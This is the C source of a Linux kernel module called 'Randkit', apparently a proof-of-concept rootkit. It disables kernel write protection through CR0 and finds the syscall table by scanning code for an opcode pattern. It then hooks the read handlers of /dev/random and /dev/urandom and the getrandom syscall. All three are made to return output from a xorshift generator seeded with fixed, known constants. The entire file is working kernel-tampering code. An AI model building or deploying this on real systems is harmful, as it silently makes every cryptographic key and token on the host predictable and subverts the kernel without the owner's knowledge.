#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/spinlock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Vincent Rasneur <vrasneur@free.fr>");
MODULE_DESCRIPTION("Randkit xor128: replaces /dev/(u)random with a xor128 PRNG");

static struct file_operations *random_fops;
static struct file_operations *urandom_fops;

static struct file_operations saved_random_fops;
static struct file_operations saved_urandom_fops;

typedef long (*rk_sys_getrandom_fun)(char __user *, size_t, unsigned int);

static void **saved_syscall_table;
static rk_sys_getrandom_fun saved_sys_getrandom;

// read/write protection, adapted from grsecurity

static inline unsigned long rk_disable_wp(void)
{
    unsigned long cr0;
  
    preempt_disable();

    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    barrier();

    return cr0;
}

static inline void rk_enable_wp(unsigned long cr0)
{
    barrier();
    write_cr0(cr0);
    barrier();
  
    preempt_enable();
}

#define RK_DISABLE_WP				\
  {						\
  unsigned long _rk_cr0;			\
  _rk_cr0 = rk_disable_wp();

#define RK_ENABLE_WP				\
  rk_enable_wp(_rk_cr0);			\
  }

static DEFINE_SPINLOCK(rk_spinlock);
struct xor128_state
{
    u32 x;
    u32 y;
    u32 z;
    u32 w;
};

struct xor128_state rk_state = { 123456789, 362436069, 521288629, 88675123 };

// XOR128 PRNG (Xorshift family)
static u32 rk_xor128(void) {
    unsigned long flags;
    u32 t;

    spin_lock_irqsave(&rk_spinlock, flags);
    t = rk_state.x ^ (rk_state.x << 11);
    
    rk_state.x = rk_state.y;
    rk_state.y = rk_state.z;
    rk_state.z = rk_state.w;
    
    rk_state.w = (rk_state.w ^ (rk_state.w >> 19)) ^ (t ^ (t >> 8));
    spin_unlock_irqrestore(&rk_spinlock, flags);

    return rk_state.w;
}

static struct file_operations *rk_get_fops(int minor)
{
    struct inode inode;
    struct file fp;
    struct address_space mapping;
  
    memset(&inode, 0, sizeof(inode));
    // chrdev_open needs a double link list here
    INIT_LIST_HEAD(&inode.i_devices);
    // get a pointer to chrdev_open
    init_special_inode(&inode, S_IFCHR, MKDEV(1, minor));

    memset(&fp, 0, sizeof(fp));
    memset(&mapping, 0, sizeof(mapping));
    // memdev_open (called by chrdev_open)
    // needs the f_mapping pointer on old 3.x kernels
    fp.f_mapping = &mapping;
  
    // inode.i_fop->open == chrdev_open
    inode.i_fop->open(&inode, &fp);

    // for urandom, fp.f_op->read is urandom_read
    printk(KERN_INFO "read fops is at: %p\n", (void *)fp.f_op->read);

    list_del(&inode.i_devices);
  
    // remove the const correctness
    return (struct file_operations *)fp.f_op;
}

static void const *rk_memmem(void const *haystack, size_t hl,
                             void const *needle, size_t nl)
{
    void const *res = NULL;

    if(nl <= hl) {
        int idx = 0;
        char const *buf = haystack;
      
        for(idx = 0; idx <= hl - nl; idx++) {
            if(memcmp(buf, needle, nl) == 0) {
                res = buf;
                break;
            }

            buf++;
        }
    }
  
    return res;
}

static void **rk_find_syscall_table(void)
{
#define OFFSET_SYSCALL 256
    void **syscall_table = NULL;
    unsigned long syscall_entry;
    char const *buf = NULL;
    
    // get the entry_SYSCALL_64 address
    rdmsrl(MSR_LSTAR, syscall_entry);
    // find the sys_call_table reference in the code
    buf = rk_memmem((void const *)syscall_entry, OFFSET_SYSCALL, "\xff\x14\xc5", 3);
    if(buf != NULL)
    {
        // convert to pointer
        unsigned long ptr = *(unsigned long *)(buf + 3);
        syscall_table = (void **)(0xFFFFFFFF00000000 | ptr);
    }
    
    return syscall_table;
}

static ssize_t rk_fill_buf(char __user *buf, size_t nbytes)
{
    size_t idx = 0;
    size_t count = nbytes / sizeof(u32);
    size_t rem = nbytes % sizeof(u32);

    if(rem != 0) {
        count++;
    }
    
    while(count != 0) {
        u32 rnd = rk_xor128();
        size_t rnd_sz = sizeof(rnd);
        
        if(count == 1 && rem != 0) {
            rnd_sz = rem;
        }
        
        if(copy_to_user(buf + idx, &rnd, rnd_sz) != 0) {
            return -1;
        }
        
        idx += sizeof(u32);
        count--;
    }

    printk(KERN_INFO "wrote %lu bytes of random data\n", nbytes);
    
    return nbytes;
}

static ssize_t rk_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    return rk_fill_buf(buf, nbytes);
}

static void rk_patch_fops(void)
{
    printk(KERN_INFO "saving random fops\n");
    
    random_fops = rk_get_fops(8);
    urandom_fops = rk_get_fops(9);
    
    saved_random_fops = *random_fops;
    saved_urandom_fops = *urandom_fops;

    printk(KERN_INFO "patching random fops\n");
  
    RK_DISABLE_WP
    random_fops->read = rk_read;
    urandom_fops->read = rk_read;
    RK_ENABLE_WP

    printk(KERN_INFO "patching done\n");
}

static asmlinkage long rk_sys_getrandom(char __user * buf, size_t count, unsigned int flags)
{
    return (long)rk_fill_buf(buf, count);
}

static void rk_patch_getrandom(void)
{
#ifdef __NR_getrandom
    saved_syscall_table = rk_find_syscall_table();

    if(saved_syscall_table != NULL)
    {
        printk(KERN_INFO "found syscall table at: %p\n", saved_syscall_table);

        printk(KERN_INFO "saving getrandom syscall\n");

        saved_sys_getrandom = (rk_sys_getrandom_fun)saved_syscall_table[__NR_getrandom];

        printk(KERN_INFO "overwriting getrandom syscall\n");
        
        RK_DISABLE_WP
        saved_syscall_table[__NR_getrandom] = (void *)rk_sys_getrandom;
        RK_ENABLE_WP

        printk(KERN_INFO "overwriting done\n");
    }
#endif // __NR_getrandom
}

static int __init rk_init(void)
{
    rk_patch_fops();
    rk_patch_getrandom();

    return 0;
}

static void rk_restore_fops(void)
{
    printk(KERN_INFO "restoring random fops\n");

    RK_DISABLE_WP
    *random_fops = saved_random_fops;
    *urandom_fops = saved_urandom_fops;
    RK_ENABLE_WP

    printk(KERN_INFO "restoring done\n");
}

static void rk_restore_getrandom(void)
{
#ifdef __NR_getrandom
    if(saved_syscall_table != NULL && saved_sys_getrandom != NULL)
    {
        printk(KERN_INFO "restoring getrandom syscall\n");
        
        RK_DISABLE_WP
        saved_syscall_table[__NR_getrandom] = (void *)saved_sys_getrandom;
        RK_ENABLE_WP

        printk(KERN_INFO "restoring done\n");
    }    
#endif
}

static void __exit rk_cleanup(void)
{
    rk_restore_fops();
    rk_restore_getrandom();
}

module_init(rk_init);
module_exit(rk_cleanup);
